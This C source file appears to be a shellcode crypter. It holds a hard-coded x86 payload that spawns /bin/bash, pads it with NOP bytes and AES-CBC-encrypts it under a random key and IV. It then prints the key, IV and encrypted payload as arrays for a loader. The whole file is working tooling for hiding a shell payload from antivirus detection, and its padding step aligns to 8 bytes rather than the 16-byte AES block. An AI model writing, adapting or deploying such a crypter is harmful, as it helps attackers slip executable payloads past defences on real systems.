#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>     // for rand()
#include <time.h>       // for time()

#define CBC 1
#define CTR 1
#define ECB 1

#include "aes.h"

int rand_byte() {
    int byte;
    do {
        byte = rand() & 0xff;
    } while (byte == 0x00);
    return byte;
}


int i;
static void encrypt(void)
{
    uint8_t key[32];
    uint8_t iv[16];

    // Shellcode "execve-stack"
	uint8_t unpadded_shellcode[] = { 
                            0x31, 0xc0, 0x50, 0x68, 0x62, 0x61, 0x73, 0x68,
                            0x68, 0x62, 0x69, 0x6e, 0x2f, 0x68, 0x2f, 0x2f,
                            0x2f, 0x2f, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53,
                            0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80 
                        };


    // seed random function
    srand(time(0));

    // pad shellcode with nops: \x90
    // for proper encryption block size
    int len = sizeof unpadded_shellcode;
    int padding = 8 - (len % 8);
    int new_len = len + padding;
    uint8_t shellcode[new_len];
    for (int x = 0; x < new_len; x++ )
        shellcode[x] = (x >= len) ? 0x90 : unpadded_shellcode[x];


    printf("Padded Shellcode:\n");
    for (int x = 0; x < new_len; x++)
        printf("\\x%02x", shellcode[x]);

    printf("\n\n// Generating Key:");
    printf("\nuint8_t key[] = { ");
    for (int x = 0; x < 32; x++) {
        int b = rand_byte();
        printf("0x%02x, ", b);
        key[x] = b;
    }
    printf("};\n\n");

    printf("// Generating IV:\n");
    printf("uint8_t iv[]  = { ");
    for (int x = 0; x < 16; x++) {
        int b = rand_byte();
        printf("0x%02x, ", b);
        iv[x] = b;
    }
    printf("};\n\n");

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_encrypt_buffer(&ctx, shellcode, sizeof(shellcode));
    
    printf("// Encrypted Shellcode:\n");
    printf("uint8_t shellcode[] = { ");
    for (i = 0; i < sizeof shellcode; i ++)
        printf("0x%02x, ", shellcode[i]);
    printf("};\n");
}

int main(void)
{
    encrypt();
}